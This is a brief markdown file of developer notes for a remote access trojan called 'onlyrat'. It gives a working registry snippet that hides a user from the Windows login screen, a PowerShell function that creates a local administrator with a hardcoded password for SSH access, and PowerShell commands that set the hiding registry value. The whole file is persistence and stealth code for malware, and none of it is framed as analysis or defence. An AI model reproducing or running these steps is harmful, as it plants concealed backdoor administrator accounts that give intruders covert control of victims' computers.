# Research notes for rat

## Hide_User.reg
- run to hide "onlyrat" user
- use vbs to bypass
```
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList]
"onlyrat"=dword:00000000 ; 
```

HKLM:\software\Microsoft\Windows NT\CurrentVersion\Winlogon

## Create admin for ssh
```powershell
function Create-NewLocalAdmin {
    [CmdletBinding()]
    param (
        [string] $NewLocalAdmin,
        [securestring] $Password
    )    
    begin {
    }    
    process {
        New-LocalUser "$NewLocalAdmin" -Password $Password -FullName "$NewLocalAdmin" -Description "Temporary local admin"
        Write-Verbose "$NewLocalAdmin local user crated"
        Add-LocalGroupMember -Group "Administrators" -Member "$NewLocalAdmin"
        Write-Verbose "$NewLocalAdmin added to the local administrator group"
    }    
    end {
    }
}
$NewLocalAdmin = "onlyrat"
$Password = (ConvertTo-SecureString "12192003" -AsPlainText -Force)
Create-NewLocalAdmin -NewLocalAdmin $NewLocalAdmin -Password $Password

# Remove-LocalUser -Name "onlyrat"
```

## Extraneous
change regs with powershell
```powershell
Set-Location -Path 'HKLM:\software\Microsoft\Windows NT\CurrentVersion\Winlogon'
Get-Item -Path 'HKLM:\software\Microsoft\Windows NT\CurrentVersion\Winlogon' | New-Item -Name 'UserList' -Force
New-ItemProperty -Path 'HKLM:\software\Microsoft\Windows NT\CurrentVersion\Winlogon\UserList' -Name 'onlyrat' -Value "0" -PropertyType DWORD -Force
```